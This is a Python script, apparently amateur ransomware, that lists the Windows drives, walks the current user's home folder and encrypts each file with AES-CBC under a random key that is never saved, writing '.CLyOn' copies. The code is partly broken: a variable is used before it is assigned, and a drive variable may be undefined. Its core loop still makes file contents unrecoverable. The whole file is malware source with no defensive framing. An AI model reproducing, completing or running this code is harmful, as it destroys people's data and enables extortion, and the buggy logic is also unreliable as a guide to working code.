__author__ = 'RetR0'

import os
import win32api
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Util.Padding import unpad
from Crypto.Random import get_random_bytes
import getpass

drives = win32api.GetLogicalDriveStrings()
drives = drives.split('\000')[:-1]

drive_1 = drives[0]

try:
    drive_2 = drives[1]
except:
    print(".")

try:
    drive_3 = drives[2]
except:
    print(".")

try:
    drive_4 = drives[3]
except:
    print(".")

try:
    drive_5 = drives[4]
except:
    print(".")

print(drive_1)
print(drive_2)

path = drive_1

# files = []
# for r, d, f in os.walk(path):
#     for file in f:
#         if '.' in file:
#             files.append(os.path.join(r, file))

# for f in files:
#     print(f)
#     print("bite 1")

# print("bite2")

username = getpass.getuser()

user_c_path = drive_1 + "Users\\" + username + "\\"


def encrypt_drive_1_files():

    path = user_c_path
    
    files = []
    for r, d, f in os.walk(path):
        for file in f:
            if '.' in file:
                files.append(os.path.join(r, file))

    for f in files:
        print(f)

        try:
            with open (f, 'rb') as f_file_to_encrypt:
                        text_block = f_file_to_encrypt.read()
        except:
            continue    
        
        key = get_random_bytes(32)

        cipher = AES.new(key, AES.MODE_CBC)
        data_result = cipher.encrypt(pad(text_block, AES.block_size))
        try:
            with open(output, 'wb') as f_output:
                f_output.write(cipher.iv)
                f_output.write(data_result)
        except:
            print("BRUHH")
    
        output = f + ".CLyOn"

        try:
            with open(output, 'wb') as f_output:
                f_output.write(data_result)
        except:
            continue

encrypt_drive_1_files()
